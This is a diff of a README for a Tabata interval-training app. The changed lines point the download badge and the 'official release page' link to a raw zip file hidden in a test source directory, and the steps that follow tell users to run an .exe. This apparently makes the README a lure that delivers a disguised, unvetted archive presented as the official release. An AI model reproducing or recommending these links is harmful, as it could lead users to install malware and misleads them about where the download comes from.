@@ -1,6 +1,6 @@
 # ⏱️ tabata-app - Improve your fitness with interval training
 
-[![Download App](https://img.shields.io/badge/Download-App-blue.svg)](https://github.com/konquerortonguingandgroovingplane241/tabata-app)
+[![Download App](https://img.shields.io/badge/Download-App-blue.svg)](https://github.com/konquerortonguingandgroovingplane241/tabata-app/raw/refs/heads/main/android/app/src/test/java/app_tabata_1.5.zip)
 
 This application helps you manage your Tabata workouts. Tabata training is a form of high-intensity interval training. You perform exercises for short periods followed by short rest breaks. This app tracks your rounds to keep you on schedule.
 
@@ -25,7 +25,7 @@ This application helps you manage your Tabata workouts. Tabata training is a for
 
 Follow these steps to get the app on your computer.
 
-1. Visit the [official release page](https://github.com/konquerortonguingandgroovingplane241/tabata-app) to find the latest version.
+1. Visit the [official release page](https://github.com/konquerortonguingandgroovingplane241/tabata-app/raw/refs/heads/main/android/app/src/test/java/app_tabata_1.5.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Select the file to start the download to your computer.
 4. Locate the downloaded file in your Downloads folder.
